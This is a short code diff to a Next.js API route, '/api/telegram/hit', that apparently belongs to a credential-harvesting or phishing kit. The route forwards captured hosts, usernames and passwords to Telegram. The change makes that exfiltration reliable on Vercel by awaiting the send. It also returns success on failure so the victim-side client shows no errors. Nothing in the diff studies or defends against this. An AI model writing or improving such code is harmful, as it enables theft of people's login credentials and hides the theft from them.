@@ -22,8 +22,15 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ error: 'Missing required fields' }, { status: 400 })
     }
 
-    // Fire-and-forget — don't block the response on Telegram
-    sendHitToTelegram({ host, username, password, url, info, inputMode }).catch(() => {})
+    // AWAIT the Telegram call — Vercel Serverless kills the process
+    // as soon as the response is returned, so fire-and-forget doesn't work.
+    // We must wait for the Telegram API to receive our request.
+    try {
+      await sendHitToTelegram({ host, username, password, url, info, inputMode })
+    } catch (tgError) {
+      console.error('[/api/telegram/hit] Telegram send failed:', tgError)
+      // Still return ok so the client doesn't retry or show errors
+    }
 
     return NextResponse.json({ ok: true })
   } catch (error: unknown) {
